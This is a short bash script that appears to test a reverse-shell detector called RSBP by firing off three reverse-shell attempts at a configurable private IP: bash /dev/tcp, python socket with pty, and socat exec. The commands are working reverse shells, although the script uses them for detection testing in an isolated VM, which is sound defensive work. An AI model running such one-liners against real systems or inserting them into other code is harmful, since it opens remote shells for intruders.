#!/bin/bash
# WARNING: Run only in isolated VM/container. This script triggers REAL reverse shell behaviors.
#
# NOTE: RSBP intentionally suppresses loopback targets (127.0.0.1/::1) to avoid noisy
# self-connections. Therefore this simulation targets a private RFC1918 IP by default.
# Override via TARGET_IP if needed.

TARGET_IP="${TARGET_IP:-192.168.1.10}"

echo "[*] Scenario 1: bash /dev/tcp (will fail to connect - detection test only)"
timeout 2 bash -c "bash -i >& /dev/tcp/${TARGET_IP}/9999 0>&1" 2>/dev/null || true
sleep 1

echo "[*] Scenario 2: python socket"
timeout 2 python3 -c "import socket,os,pty;s=socket.socket();s.connect(('${TARGET_IP}',9998));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn('/bin/sh')" 2>/dev/null || true
sleep 1

echo "[*] Scenario 3: socat"
timeout 2 socat TCP:${TARGET_IP}:9997 EXEC:/bin/sh 2>/dev/null || \
timeout 2 bash -c "exec 3<>/dev/tcp/${TARGET_IP}/9997; cat <&3 | sh >&3 2>&3" 2>/dev/null || true

echo "[+] Simulation complete. Check /var/log/rsbp/alerts.jsonl for detections."
